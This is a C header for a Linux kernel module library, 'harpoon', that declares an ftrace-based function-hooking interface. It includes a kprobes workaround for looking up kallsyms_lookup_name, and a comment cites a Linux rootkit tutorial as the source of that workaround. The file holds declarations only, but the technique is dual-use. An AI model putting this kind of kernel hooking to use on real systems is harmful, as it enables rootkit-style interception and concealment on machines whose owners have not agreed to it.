#ifndef H_HARPOON_HK
#define H_HARPOON_HK

#include <linux/version.h>
#include <linux/list.h>
#include <linux/ftrace.h>

/* Hook container */
struct harpoon_hook {
    struct list_head list;
    struct mutex lock;
    __u8 recur_prot;
    __u8 is_hooked;
    void *self;
    void *legit;
    __u64 sym_addr;
    char *name;
    struct ftrace_ops ops;
};

#define DYNAMIC_FTRACE

/*
Kernel ver. >= 5.7, gotta get kallsyms_lookup_name with kprobes
https://xcellerator.github.io/posts/linux_rootkits_11/#the-kallsyms-problem
*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs
#endif

/* Vicious recursion protection modes */
enum {
    FENTRY_OFF,
    RECUR_DETECT,
    NO_PROT
};

__u64 harpoon_lookup_name(char *name);

struct harpoon_hook *harpoon_new_hook(char *name, void *func, __u8 recur_prot);

void harpoon_del_hook(struct harpoon_hook *hook);

void harpoon_hook(struct harpoon_hook *hook);

void harpoon_unhook(struct harpoon_hook *hook);

#endif